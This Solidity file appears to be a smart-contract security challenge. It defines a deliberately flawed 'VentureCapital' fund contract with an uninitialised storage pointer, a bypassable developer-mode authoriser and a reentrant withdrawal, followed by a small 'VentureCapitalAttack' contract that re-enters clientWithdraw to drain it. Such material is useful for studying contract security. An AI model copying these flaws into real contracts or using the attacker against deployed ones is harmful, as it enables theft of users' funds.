pragma solidity ^0.4.24;

import 'hardhat/console.sol';

contract DeveloperAuthorizer {
  bool public developerMode;

  constructor() public payable {
    if (address(this).balance >= 0.424242 ether) {
      developerMode = true;
    }
  }

  function turnOff() public payable {
    require(msg.sender == tx.origin, "Sorry, humans only.");
    if (msg.value > 0 && address(this).balance == 1 ether) {
      developerMode = false;
    }
  }

  function kill() public {
    require(developerMode == false);
    selfdestruct(msg.sender);
  }
}

contract VentureCapital {
  struct Client {
    address manager;
    uint256 age;
    address clientAddress;
    uint256 amount;
  }

  address public manager;
  address public owner;
  uint256 public startTime;
  uint256 public clientBalance;
  mapping(address => bool) public fundManagementEnabled;
  mapping(address => uint256) public clientIndex;
  Client[] public clients;
  DeveloperAuthorizer public developerAuthorizer;

  constructor() public payable {
    // developerAuthorizer = (new developerAuthorizer).value(0.424242 ether)();
    developerAuthorizer = new DeveloperAuthorizer();
    owner = address(0x593Bc8EF18E35a3E3022412727c13768cB36da71);
    manager = msg.sender;
  }

  modifier isManager() {
    require(
      fundManagementEnabled[msg.sender] ||
        msg.sender == manager ||
        developerAuthorizer.developerMode(),
        "!isManager"
    );
    _;
  }

  function managementEnable(address _newManager) public isManager {
    fundManagementEnabled[_newManager] = true;
  }

  function newClient(address _clientAddress, uint256 _age)
    public
    payable
    isManager
  {
    uint256 index = clientIndex[_clientAddress];
    if (index != 0) {
      console.log('72 index: ', index);
      Client storage client = clients[index - 1];
      console.log('74 client.amount: ', client.amount);
      client.amount += msg.value;
      clientBalance += msg.value;
      console.log('77 client.amount: ', client.amount);
    } else {
      console.log('79 index: ', index);
      console.log('80 client.amount0: ', client.amount);
      clientBalance += msg.value;
      client.manager = manager;
      client.age = _age;
      client.clientAddress = _clientAddress;
      client.amount = msg.value;
      console.log('86 client.amount1: ', client.amount);
      clients.push(client);
      clientIndex[_clientAddress] = clients.length;
    }
  }

  function byeClient() public isManager {
    uint256 all = clients.length;
    for (uint256 i = all; i >= 1; i--) {
      clients[i - 1].clientAddress.transfer(clients[i - 1].amount + 1);
      clients.length -= 1;
    }
  }

  function clientWithdraw(address _clientAddress) public isManager {
    uint256 index = clientIndex[_clientAddress];
    require(index != 0);
    Client storage client = clients[index - 1];
    if (client.amount > 0) {
      client.clientAddress.call.value(1)();
      clientBalance -= 1;
      client.amount -= 1;
    }
  }

  function close() public isManager {
    require(developerAuthorizer.developerMode() == false, 'developerMode is on');
    require(msg.sender == owner, '!owner');
    require(clients.length == 0);
    msg.sender.transfer(address(this).balance);
  }

  function getClientsLength() public view returns (uint256){
    return clients.length;
  }

  function() external payable {}
}

contract VentureCapitalAttack {
  address vcAddr;

  constructor(address _vcAddr) {
    vcAddr = _vcAddr;
  }

  function() external payable {
    VentureCapital(vcAddr).clientWithdraw(address(this));
  }
}
